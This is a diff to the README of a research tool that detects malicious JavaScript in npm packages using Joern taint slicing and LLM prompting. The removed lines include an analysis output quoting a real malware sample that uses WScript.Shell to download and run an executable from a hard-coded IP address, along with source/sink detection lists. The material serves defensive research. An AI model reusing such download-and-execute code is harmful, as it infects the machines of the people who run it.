@@ -4,49 +4,18 @@
 [![Joern](https://img.shields.io/badge/Joern-4.0.436-blue.svg)](https://joern.io/)
 [![Docker](https://img.shields.io/badge/Docker-Supported-blue.svg)](https://www.docker.com/)
 
-## 🎯 Overview
-
-JSCodeSlicing (**taint_slicing** folder) is a **static analysis tool** designed to detect malicious patterns in JavaScript code by performing taint analysis and code slicing. It uses **Code Property Graphs (CPG)** powered by [Joern](https://joern.io/) to identify data flows from untrusted sources (e.g., `process.argv`, network requests) to dangerous sinks (e.g., `eval()`, file writes, command execution).
-
-### Why JSCodeSlicing?
-
-- 🔍 **Malware Detection** - Identifies obfuscated malicious code patterns
-- 🛡️ **Security Analysis** - Tracks tainted data flows from sources to sinks
-- 🐳 **Docker Isolated** - Safely analyze real malware in containers
-- 📊 **Code Slicing** - Extracts only relevant code paths for analysis
-- ⚡ **Automated** - Batch processing of multiple JavaScript files
-
 ---
 
-## ✨ Features
+## Modules
 
-| Feature | Description |
-|---------|-------------|
-| **Taint Analysis** | Tracks data flow from untrusted sources to dangerous sinks |
-| **Malware Detection** | Identifies C&C servers, obfuscation, remote code execution |
-| **Code Slicing** | Extracts minimal code needed to understand security flows |
-| **Docker Support** | Run analysis in isolated containers for safety |
-| **Batch Processing** | Analyze multiple packages with checkpoint tracking |
-| **Real Malware Testing** | Includes script to download real malware samples safely |
+- **taint_slicing**: Core implementation of our taint-based slicing approach. It integrates both Control Flow Graph (CFG) and Data Flow Graph (DFG) to track explicit information flows from sources to sinks.
+- **static_slicing**: Baseline implementation using static slicing based solely on Control Flow Graph (CFG). This module serves as a benchmark for evaluating the effectiveness of the taint-based approach.
+- **prompting**: Contains the prompting schemes for automated malicious code assessment using Large Language Models (see installation and procedure at [Run Prompting Scheme](#run-prompting-scheme).
 
-### Detected Threats
-
-- 🚨 Remote Code Execution (`eval`, `Function`, `setTimeout`)
-- 🌐 Network Communication to C&C servers
-- 💾 File System Manipulation
-- 🔐 Code Obfuscation (Base64, `String.fromCharCode`)
-- 🪟 Windows Scripting Host (`WScript.Shell`)
-- ⚙️ Process Execution (`child_process.exec`, `spawn`)
-
----
 
 ## Dataset
 
-This research uses the malicious package dataset provided by Wang et al. in their repository [MalPacDetector](https://github.com/CGCL-codes/MalPacDetector-core)    
-The dataset is **not publicly available** due to security reasons and its unpublished status.  
-
-We have obtained permission to use it for our research.  
-If you wish to access the dataset, please contact the original authors directly: hust_jianw@hust.edu.cn.
+This research uses the malicious package dataset provided by Wang et al. in their repository [MalPacDetector](https://github.com/CGCL-codes/MalPacDetector-core)
 
 ---
 
@@ -174,27 +143,6 @@ src/main/resources/output/
     └── cpg.bin           # Code Property Graph (binary)
 ```
 
-### Example: Analyzing Test Sample
-
-Create a simple test file:
-
-```bash
-mkdir -p src/main/resources/input/test_sample
-```
-
-**File:** `src/main/resources/input/test_sample/test.js`
-```javascript
-var userInput = process.argv[2];  // Source: User input
-eval(userInput);                   // Sink: Code execution
-```
-
-**Run:**
-```bash
-sbt run
-```
-
-**Result:** Code slice showing the flow from `process.argv` → `eval`
-
 ---
 
 ### Docker Usage (Real Malware)
@@ -235,196 +183,6 @@ docker rm malware-test
 
 ---
 
-## 📁 Project Structure
-
-```
-taint_slicing/
-├── src/
-│   ├── main/
-│   │   ├── scala/
-│   │   │   ├── Main.scala              # Entry point
-│   │   │   ├── CodeSlice/
-│   │   │   │   ├── CodeSlice.scala     # Trait definition
-│   │   │   │   ├── CodeSliceImp.scala  # Core analysis logic
-│   │   │   │   ├── Group/              # Source/Sink node groups
-│   │   │   │   └── Path/               # Path extraction
-│   │   │   ├── FileProcessor/          # File I/O operations
-│   │   │   │   ├── IOFileProcessor.scala
-│   │   │   │   └── IOFileProcessorImpl.scala
-│   │   │   └── Type/
-│   │   │       ├── Source/
-│   │   │       │   └── SourceGroups.scala  # Define sources
-│   │   │       ├── Sink/
-│   │   │       │   └── SinkGroups.scala    # Define sinks
-│   │   │       └── TypeDefinition.scala
-│   │   └── resources/
-│   │       ├── input/                   # Your JS files here
-│   │       │   └── [package-name]/
-│   │       ├── output/                  # Analysis results
-│   │       │   └── [package-name]/
-│   │       ├── checkpoint.txt           # Processed packages
-│   │       └── is_processing.txt        # Currently processing
-│   └── test/
-│       └── scala/                       # Unit tests
-├── astgen/
-│   └── astgen-win.exe                   # AST generator binary
-├── project/
-│   └── build.properties
-├── build.sbt                            # SBT configuration
-├── Dockerfile                           # Docker image definition
-├── docker-test.ps1                      # Windows Docker runner
-├── download-malware.sh                  # Malware downloader (Docker only)
-├── setup.ps1                            # Windows setup script
-└── README.md
-```
-
----
-
-## 🔍 How It Works
-
-### Analysis Pipeline
-
-```
-┌─────────────────┐
-│ JavaScript Code │
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│  astgen (CPG)   │  ← Creates Code Property Graph
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│ Source Detection│  ← Find untrusted data sources
-│ - process.argv  │     • User input
-│ - HTTP requests │     • Network data
-│ - File reads    │     • Environment vars
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│ Sink Detection  │  ← Find dangerous operations
-│ - eval()        │     • Code execution
-│ - exec()        │     • Command execution
-│ - writeFile()   │     • File writes
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│ Taint Analysis  │  ← Track data flow
-│ (BFS Traversal) │     Source → ... → Sink
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│  Code Slicing   │  ← Extract relevant code
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│ code_slice.txt  │  ← Final output
-└─────────────────┘
-```
-
-### Source & Sink Definitions
-
-**Sources** (Untrusted Data)
-- `process.argv`, `process.env` - User/environment input
-- `http.get()`, `fetch()` - Network requests
-- `fs.readFile()` - File reads
-- `String.fromCharCode()` - Obfuscation
-- `atob()`, `decodeURI()` - Encoding
-
-**Sinks** (Dangerous Operations)
-- `eval()`, `Function()` - Code execution
-- `child_process.exec()` - Command execution
-- `fs.writeFile()` - File writes
-- `http.request()` - Network sends
-- `WScript.Shell.Run()` - Windows execution
-
-📝 *Full lists in `src/main/scala/Type/Source/SourceGroups.scala` and `SinkGroups.scala`*
-
----
-
-## ⚙️ Configuration
-
-### Customize Sources/Sinks
-
-**Add Custom Source:**
-
-Edit `src/main/scala/Type/Source/SourceGroups.scala`:
-
-```scala
-private val CUSTOM_SOURCES: Seq[TypeDefinition] = Seq(
-  CallType("myCustomSource"),
-  CodeType("myVariable"),
-  RegexType(".*pattern.*")
-)
-```
-
-**Add Custom Sink:**
-
-Edit `src/main/scala/Type/Sink/SinkGroups.scala`:
-
-```scala
-private val CUSTOM_SINKS: Seq[TypeDefinition] = Seq(
-  CallType("dangerousFunction"),
-  RegexType(".*malicious.*")
-)
-```
-
-### Adjust Timeout
-
-Edit `Main.scala` line 43:
-
-```scala
-val TIMEOUT_SECONDS = 180  // Change to 300 for slower analysis
-```
-
----
-
-## 📊 Examples
-
-### Example 1: Simple Taint Flow
-
-**Input:** `src/main/resources/input/example1/test.js`
-```javascript
-var input = process.argv[2];
-eval(input);
-```
-
-**Output:** `src/main/resources/output/example1/code_slice.txt`
-```
-// File: test.js
-// ======================================================================
-Line 1: var input = process.argv[2]
-Line 2: eval(input)
-```
-
----
-
-### Example 2: Real Malware Detection
-
-**Input:** Downloaded malware from Docker
-
-**Output:** `output/malware_samples/code_slice.txt`
-```javascript
-// File: real_malware_10.js
-Line 8: var GnjajlnEi = NbjdnsclFfiBPsM("WScript.Shell");
-Line 11: var zzauIjtSBHO = NbjdnsclFfiBPsM("MSXML2.XMLHTTP"); 
-Line 32: zzauIjtSBHO.open("GET", MNxmxraR, false);
-Line 33: zzauIjtSBHO.send();
-Line 43: igMcqGRHjo("http://46.30.42.123/venturi.exe", "199997684.exe", 1)
-```
-
-**Analysis:**
-- 🚨 C&C Server: `46.30.42.123`
-- 🚨 Downloads: `venturi.exe`
-- 🚨 Execution: WScript.Shell
-
----
-
 ## 🐛 Troubleshooting
 
 ### Common Issues
@@ -454,47 +212,9 @@ sbt clean compile
 
 ---
 
-## 🤝 Contributing
+## Run Prompting Scheme
 
-Contributions are welcome! Here's how you can help:
-
-1. **Add More Sources/Sinks** - Expand malware detection coverage
-2. **Improve Flow Detection** - Enhance taint analysis algorithms
-3. **Add Test Cases** - Create more malware samples for testing
-4. **Documentation** - Improve guides and examples
-5. **Performance** - Optimize CPG traversal
-
-### Development Setup
-
-```bash
-# Clone repository
-git clone https://github.com/yourusername/JSCodeSlicing.git
-
-# Install dependencies
-sbt update
-
-# Run tests
-sbt test
-
-# Format code
-sbt scalafmt
-```
-
----
-
-## 📚 Resources
-
-- **Joern Documentation:** [https://docs.joern.io/](https://docs.joern.io/)
-- **astgen Repository:** [https://github.com/joernio/astgen](https://github.com/joernio/astgen)
-- **Code Property Graph:** [https://cpg.joern.io/](https://cpg.joern.io/)
-- **Malware Samples:** [MALWARE_LINKS.md](MALWARE_LINKS.md)
-
----
-
-# Automated Malicious Code Detection using Large Language Models
-An LLM-powered security analysis system that uses code slicing to automatically detect malicious code inside npm packages by extracting relevant code slices and evaluating them for harmful behavior (in **prompting** folder).
-
-## Installation
+### Installation
 1. Create a vitural environment and activate it
 ```bash
 python3 -m venv venv
@@ -507,7 +227,7 @@ source venv/bin/active
 ```bash
 pip install -r requirements.txt
 ```
-## Usage
+### Procedure
 1. Create your own config json file to set up your favorite config and model
 
  For example:
@@ -526,10 +246,7 @@ pip install -r requirements.txt
 ```python
 config = ModelConfig.from_json_file("<PATH TO JSON CONFIG FILE>")
 ```
-3. Config slices to detect (Thang will update)
-
-
-Coming soon ... 
+3. Config slices to detect
 
 4. Run the model 
 ```bash
@@ -551,16 +268,3 @@ python3 main.py
   "securityRisk": float              // estimated security risk severity (0.00-1.00)
 }
 ```
----
-
-**Made with ❤️ by Security Researchers**
-
-*Last Updated: November 2025*
-
----
-
-# ⚠️ Disclaimer
-
-This tool is designed for **security research and educational purposes only**. The included malware samples are real and potentially harmful. Always use Docker for malware analysis and never execute malware on production systems.
-
-**Use at your own risk.** The authors are not responsible for any damage caused by misuse of this tool.
